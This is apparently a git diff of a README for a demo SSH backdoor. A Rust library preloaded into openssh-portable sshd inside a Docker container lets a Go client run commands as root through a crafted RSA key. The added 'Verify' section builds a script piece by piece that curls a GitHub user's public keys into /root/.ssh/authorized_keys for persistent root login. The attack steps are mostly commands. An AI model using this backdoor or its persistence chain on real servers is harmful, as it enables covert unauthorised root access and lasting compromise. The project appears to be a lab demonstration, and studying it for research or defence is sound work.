@@ -18,55 +18,19 @@ TODO: find out how the RSA key works with the magic bit and stuff. I did this mo
 
 ## The demo
 
-To run the demo we use openssh-portable. We compile this with some extra options that make running it a bit easier. The we run it while forcing it to load our compiled rust library. The we use the Go client to connect with the correct RSA key.
+To run the demo we use openssh-portable. We run it while forcing it to load our compiled rust library. The we use the Go client to connect with the correct RSA key.
 
-### dependencies
+### Dependencies
 
-The easiest way to install all dependencies is with the nix package manager. Just run `nix-shell shell.nix` in the root of the project. Run all other command in this shell. If nix is not an option, you'll have to install all the dependencies manually. The nix.shell file has a list that can be followed.
+The easiest way to install all dependencies is with the nix package manager. Just run `nix-shell shell.nix` in the root of the project. This install rust and go only in that current shell. Rust is only needed if you are intending to change the trigger library. It is also required to have a running docker installed and running.
 
-### Library.
+### Building
 
-To compile the library, go into the ssh_backdoor_trigger folder, and compile:
+To build the docker image for the container that will run ssh-server, run `docker build --tag vulnerable_ssh_server .` This will build the rust library, compile openssh-portable from source and setup a user and directory ssh-server needs to run. For more information about what is happening check out the [Dockerfile](./Dockerfile).
 
-```
-cd ssh_backdoor_trigger
-cargo build --release
-```
+### Running
 
-### Openssh
-
-From root run these commands:
-
-```
-git clone https://github.com/openssh/openssh-portable
-cd openssh-portable
-
-# optional, but ensures it uses the exact version the library was made for
-git checkout V_10_2_P1
-
-autoreconf
-
-# the options here allow ssh to run with the nobody user (that is installed on a lot of systems)
-# if this user does not exist on your system you can change it to one that does
-# it also sets the execution directory to the current directory
-# these options do not change sshd, just make it easier to run.
-./configure --with-privsep-user=nobody --libexecdir="$(pwd)"
-make
-
-# the LD_PRELOAD environment variable forces the process to first look at our library
-# only after our library it looks anywhere else when looking for symbols
-sudo LD_PRELOAD="$(pwd)/../ssh_backdoor_trigger/target/release/libtrigger.so" \
-    "$(pwd)/sshd" \
-    -f /dev/null \
-    -D -ddd \
-    -p 2222 \
-    -h "$(pwd)/../test_conf/ssh_host_ed25519_key" \
-    -o PidFile="$(pwd)/../test_conf/sshd.pid" \
-    -o AuthorizedKeysFile="$(pwd)/../test_conf/authorized_keys" \
-    -o StrictModes=no \
-    -o UsePrivilegeSeparation=no \
-    -o PubkeyAcceptedAlgorithms=+ssh-rsa
-```
+Now run the container with `docker run --rm -it -p "2222:2222" --name vulnerable_ssh_server vulnerable_ssh_server:latest`. This will start sshd while preloading our library.
 
 ### The client
 
@@ -75,8 +39,32 @@ To now exploit the vulnerable server use the go script
 In the ssh_backdoor_client folder run:
 
 ```
-go run . -cmd "id > /tmp/fasdfasdf" -addr 127.0.0.1:2222 -usr root
+go run . -cmd "id > /tmp/exploit" -addr 127.0.0.1:2222 -usr root
 ```
 
 You can change the command and address to whatever you like to use.
 The user should be an existing user on the system sshd is running on, and should not be locked
+
+### Verify
+
+To check the exploit works we can now check out the file system of the docker contain. Run `docker exec -it vulnerable_ssh_server /bin/bash` exec into the container and run `cat /tmp/exploit`. You should see the output of the `id` command for the root user. You can further experiment with this and try to use different commands.
+
+Because the entire command is decoded into the rsa key, the command has a maximum length of 64 characters. However every command can be executed by slowly building a command in a file, and executing that file. The following is a demonstration on how to gain real ssh-root access. Add a bit of time between these commands, because sshd will add a time penalty if there are to many attempts in a short time. If you have the docker container logs open you will be able to see when something is successful and when not based on the logs.
+
+```
+go run . -cmd "echo -n \"curl https://github.com\" >> /tmp/s"
+go run . -cmd "echo -n \"/LuukBlankenstijn.keys \" >> /tmp/s"
+go run . -cmd "echo \">> /root/.ssh/authorized_keys\" >> /tmp/s"
+
+
+# wait ten seconds
+go run . -cmd "mkdir -p /root/.ssh"
+go run . -cmd "touch /root/.ssh/authorized_keys"
+go run . -cmd "apt update && apt install -y curl"
+
+#wait ten seconds
+go run . -cmd "chmod +x /tmp/s"
+go run . -cmd "/tmp/s"
+```
+
+After this all runs you will now be able to ssh into the container on port 2222: `ssh root@127.0.0.1 -p2222`. Remember to change the LuukBlankenstijn.keys for your own username on GitHub.
